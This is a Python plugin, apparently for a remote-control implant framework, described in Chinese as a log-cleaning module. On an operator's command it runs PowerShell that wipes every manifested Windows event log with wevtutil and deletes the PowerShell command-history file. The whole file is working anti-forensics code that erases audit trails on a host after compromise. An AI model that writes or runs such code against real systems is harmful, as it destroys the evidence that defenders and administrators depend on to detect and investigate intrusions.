"""日志清理模块 - logging"""

from modules.api import ModuleBase


class LoggingModule(ModuleBase):
    @property
    def name(self):
        return "logging"

    @property
    def description(self):
        return "日志清理模块 - 清除事件日志"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")

        if t == "log":
            action = p.get("action") if p else None
            if action == "clear":
                return self._log_clear(p)
            elif action == "history":
                return self._log_history(p)
            else:
                return {"status": "error", "result": f"Unknown action: {action}", "result_type": "error"}
        else:
            return {"status": "error", "result": f"Unknown command: {t}", "result_type": "error"}

    def get_commands(self):
        return ["log"]

    def _log_clear(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Only Windows", "result_type": "error"}
            
            powershell_script = """
try {
    $logs = Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Where-Object { $_.IsManifested }
    foreach ($log in $logs) {
        try {
            wevtutil cl "$($log.LogName)"
            Write-Output "Cleared: $($log.LogName)"
        }
        catch {
            Write-Output "Skipped: $($log.LogName)"
        }
    }
    Write-Output "Done"
}
catch {
    Write-Output "Error: $_"
}
"""
            result = __import__('subprocess').run(['powershell', '-Command', powershell_script], capture_output=True, text=True, timeout=30)
            return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "log_clear"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _log_history(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Only Windows", "result_type": "error"}
            
            powershell_script = """
try {
    Remove-Item (Get-PSReadLineOption).HistoryFilePath -ErrorAction SilentlyContinue
    Write-Output "PowerShell history cleared"
}
catch {
    Write-Output "Error: $_"
}
"""
            result = __import__('subprocess').run(['powershell', '-Command', powershell_script], capture_output=True, text=True, timeout=10)
            return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "log_history"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = LoggingModule()
